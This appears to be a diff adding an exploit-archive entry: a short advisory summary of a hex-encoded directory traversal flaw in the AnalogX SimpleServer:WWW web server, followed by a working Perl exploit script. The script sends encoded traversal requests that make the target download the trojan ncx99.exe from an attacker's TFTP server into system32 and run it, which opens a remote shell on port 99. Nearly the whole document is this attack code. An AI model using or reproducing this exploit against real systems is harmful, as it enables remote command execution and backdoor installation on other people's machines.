@@ -1,0 +1,52 @@
+source: http://www.securityfocus.com/bid/3112/info
+
+SimpleServer:WWW is a freely available HTTP daemon available from AnalogX. It is designed for simplicity of operation.
+
+A problem with the web server could allow a remote user to execute arbitrary commands, and potentially gain local access to the system. The problem is in the validation of URLs that have been encoded in hex. By encoding an URL in hex, it is possible to bypass any filtering for directory traversal, and execute arbitrary programs on the local system. 
+
+# SimpleServer:WWW Command Execution Vulnerability
+# CODED BY THRAN
+# CDLNI 2001
+# www.cdlni.com
+# You may distribute this code freely
+# Iam in no way responsible for this code, its for testing use only
+# This script uploads ncx99.exe to the target server and executes it
+# simply telnet to target computer on port 99 after executing the trojan
+# You need a tftp server listening on a remote computer
+# ncx99.exe needs to be in the base dir of the tftp server
+# <<<<<DO NOT FORGET TO ENTER A TFTP SERVER INSIDE THIS SCRIPT! :) >>>>>> (yes including the () part :) )
+# Greetz go out to Zerostealth, Creeping Death, Hellb0und, Shell (Warezd00d :) ) Kim Lloyd, and all my other buds
+# btw, dont bug me with my sloppy coding, and dont even ask me why I had to create 2 socket handlers :/
+# bye, have fun
+#!/usr/bin/perl
+
+use IO::Socket;
+print "Enter server IP:";
+$server=<STDIN>;
+endl;
+print "Enter remote port:";
+$port=<STDIN>;
+endl;
+print "Uploading file... this may take a minute";
+endl;
+endl;
+$remote = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$server, PeerPort=>$port, Reuse=>1) or die "Can't connect to \"$server\"\n";
+$remote->autoflush(1);
+# Here we write the actual HTTP request to the server, had to encode the entire url
+$url="GET /cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Ftftp%20-i%20(ENTER THE IP OF A TFTP SERVER HERE)%20GET%20ncx99.exe%20c%3a%5c%5cwinnt%5c%5csystem32%5c%5cblab%2eexe HTTP/1.0 \n\n";
+print $url;
+print $remote $url;
+# receive everything the server sends and print it to the screen
+while (<$remote>) { print }
+close $remote;
+endl;
+endl;
+endl;
+print "Executing the trojan... If the screen seems to hang, the trojan should work";
+$remote2 = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$server, PeerPort=>$port, Reuse=>1) or die "Can't connect to \"$server\"\n";
+$remote2->autoflush(1);
+#Simply executing the trojan, of course the entire url is still encrypted :)
+print $remote2 "GET /cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fblab HTTP/1.0 \n\n";
+# receive everything the server sends and print it to the screen
+while (<$remote2>) { print }
+close $remote2;
